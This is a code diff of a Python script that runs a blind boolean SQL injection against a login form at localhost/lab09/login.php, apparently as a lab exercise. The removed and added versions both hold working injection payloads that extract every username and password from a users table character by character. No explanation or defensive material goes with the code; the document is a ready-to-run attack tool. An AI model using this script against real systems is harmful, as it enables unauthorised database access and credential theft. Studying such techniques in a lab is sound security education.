@@ -2,40 +2,46 @@ import urllib.request
 import urllib.parse
 import string
 
-BASE_URL = "http://localhost/lab09/login.php"
-CHARSET = string.ascii_letters + string.digits
-SUCCESS_MARKER = "Printing cat"
+TARGET_URL = "http://localhost/lab09/login.php"
+VALID_SIGNAL = "Printing cat"
+CHARS = string.ascii_letters + string.digits
 
-def is_success(u, p):
-    params = urllib.parse.urlencode({"u": u, "p": p})
-    url = BASE_URL + "?" + params
-    response = urllib.request.urlopen(url)
-    html = response.read().decode("utf-8")
-    return SUCCESS_MARKER in html
+def request_true(payload):
+    params = urllib.parse.urlencode({"u": payload, "p": "x"})
+    try:
+        with urllib.request.urlopen(f"{TARGET_URL}?{params}") as response:
+            return VALID_SIGNAL in response.read().decode("utf-8")
+    except:
+        return False
 
-def get_length(row, field):
-    for length in range(1, 200):
-        payload = '" OR (SELECT LENGTH(' + field + ') FROM users LIMIT 1 OFFSET ' + str(row) + ')=' + str(length) + ' -- '
-        if is_success(payload, "x"):
-            return length
-    return 0
+def extract_data():
+    for row in range(100):
+        username = ""
+        for pos in range(1, 64):
+            found = False
+            for char in CHARS:
+                sql = f'" OR (SELECT ASCII(SUBSTRING(username,{pos},1)) FROM users LIMIT 1 OFFSET {row})={ord(char)} -- '
+                if request_true(sql):
+                    username += char
+                    found = True
+                    break
+            if not found: break
+            
+        if not username: 
+            break
 
-def get_char(row, field, pos):
-    for c in CHARSET:
-        payload = '" OR (SELECT ASCII(SUBSTRING(' + field + ',' + str(pos) + ',1)) FROM users LIMIT 1 OFFSET ' + str(row) + ')=' + str(ord(c)) + ' -- '
-        if is_success(payload, "x"):
-            return c
-    return ""
+        password = ""
+        for pos in range(1, 64):
+            found = False
+            for char in CHARS:
+                sql = f'" OR (SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users LIMIT 1 OFFSET {row})={ord(char)} -- '
+                if request_true(sql):
+                    password += char
+                    found = True
+                    break
+            if not found: break
 
-results = []
-for row in range(100):
-    ulen = get_length(row, "username")
-    username = ""
-    for i in range(1, ulen + 1):
-        username = username + get_char(row, "username", i)
-    plen = get_length(row, "password")
-    password = ""
-    for i in range(1, plen + 1):
-        password = password + get_char(row, "password", i)
-    results.append((username, password))
-    print("Row " + str(row) + ": " + username + " / " + password)
+        print(f"Row {row}: {username} / {password}")
+
+if __name__ == "__main__":
+    extract_data()
